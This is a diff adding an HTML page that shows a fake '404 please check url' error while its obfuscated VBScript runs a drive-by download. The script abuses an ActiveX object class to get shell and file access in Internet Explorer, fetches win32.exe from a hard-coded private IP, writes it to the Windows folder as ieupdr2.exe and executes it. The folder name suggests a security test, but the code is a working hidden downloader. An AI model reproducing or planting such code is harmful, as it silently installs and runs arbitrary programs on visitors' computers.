@@ -1,0 +1,100 @@
+<HTML xmlns:IE>
+<body>
+
+<SCRIPT language="VBScript">
+
+souytrcvbnsaudy="http://192.168.200.31/sicherheitstest.ch/win32.exe"
+
+   If navigator.appName="Microsoft" & " Internet " & "Explorer" Then
+
+      If InStr(navigator.platform,"Win32") <> 0  Then
+
+      Const klsducfasocn=20
+      Const diovvskjo=3
+      Const ptfvbnmsdicaf=1
+      Const oyvknbspitd=2
+
+      Dim  sdoiyfvlcnas
+      Dim  eivsispjbs
+      Dim  dfghbdxae
+      Dim  iewvlsdhbxsfg
+      Dim  sdfndasdr
+      Dim  nmsdfcu
+
+      Dim  nawruvsf
+      Dim  uscvkshb
+      Dim  ioerrfds
+      Dim  nadfjyt
+      Dim  lsdkhlkavx
+      Dim   kjvcsidsvcgs
+      Dim   sflgherus
+
+      Randomize
+
+      uscvkshb="ieupdr2.exe"
+
+      Set  sdoiyfvlcnas=document.createElement("ob" & "ject")
+      sdoiyfvlcnas.setAttribute "i" & "d","sdoiyfvlcnas"
+      sdoiyfvlcnas.setAttribute "cla" & "ssid",utedfavskcajshf
+
+      Set nmsdfcu = sdoiyfvlcnas.CreateObject("Shel" & "l.Applic" & "ation","")
+      Set oFolder = nmsdfcu.NameSpace(klsducfasocn)
+      Set oFolderItem=oFolder.ParseName("Symbol.ttf")
+      Font_Path_Components=Split(oFolderItem.Path,"\",-1,1)
+      nawruvsf= Font_Path_Components(0) & "\" &  Font_Path_Components(1) & "\"
+      uscvkshb=nawruvsf & uscvkshb
+
+      kjvcsidsvcgs="Micros" & "oft"
+      sflgherus="XMLHT" & "TP"
+      set eivsispjbs = CreateObject(kjvcsidsvcgs & "." & sflgherus)
+      sdfgfnhwieu="G" & "ET"
+      HTTPSession=eivsispjbs.Open(sdfgfnhwieu,souytrcvbnsaudy,0)
+      eivsispjbs.Send()
+      On Error Resume Next
+      ioerrfds=eivsispjbs.responseBody
+
+      On Error Resume Next
+      Set iewvlsdhbxsfg=sdoiyfvlcnas.CreateObject("ADOD"&"B.Str"&"eam","")
+      If Err.number <> 0 Then
+
+            Set dfghbdxae=sdoiyfvlcnas.CreateObject(oiyewfjsdbflskdklh(),"")
+            Set nadfjyt=dfghbdxae.CreateTextFile(uscvkshb, TRUE)
+            Plugin_size=LenB(ioerrfds)
+
+            For j=1 To Plugin_size
+                lsdkhlkavx=MidB(ioerrfds,j,1)
+                ByteCode=AscB(lsdkhlkavx)
+                nadfjyt.Write(Chr(ByteCode))
+            Next
+            nadfjyt.Close
+
+            Set  sdfndasdr=sdoiyfvlcnas.CreateObject("WScri" & "pt.Shell","")
+            On Error Resume Next
+            sdfndasdr.Run (uscvkshb),1,FALSE
+      Else
+            iewvlsdhbxsfg.Mode=diovvskjo
+            iewvlsdhbxsfg.Type=ptfvbnmsdicaf
+            iewvlsdhbxsfg.Open
+            iewvlsdhbxsfg.Write ioerrfds
+            iewvlsdhbxsfg.SaveToFile uscvkshb,oyvknbspitd
+
+            nmsdfcu.ShellExecute uscvkshb
+      End If
+      End If
+   End If
+
+Function utedfavskcajshf()
+utedfavskcajshf = "cls"&"id:BD9"&"6C556-6"&"5A3-11D0-98"&"3A-00C04"&"FC29E36"
+End Function
+
+
+Function oiyewfjsdbflskdklh()
+utedfavskcajshf = "Scripting" & ".FileSyst" & "emObject"
+End Function
+
+</SCRIPT>
+sorry. please check url. <BR><B>Error: 
+
+404
+</body>
+</html>
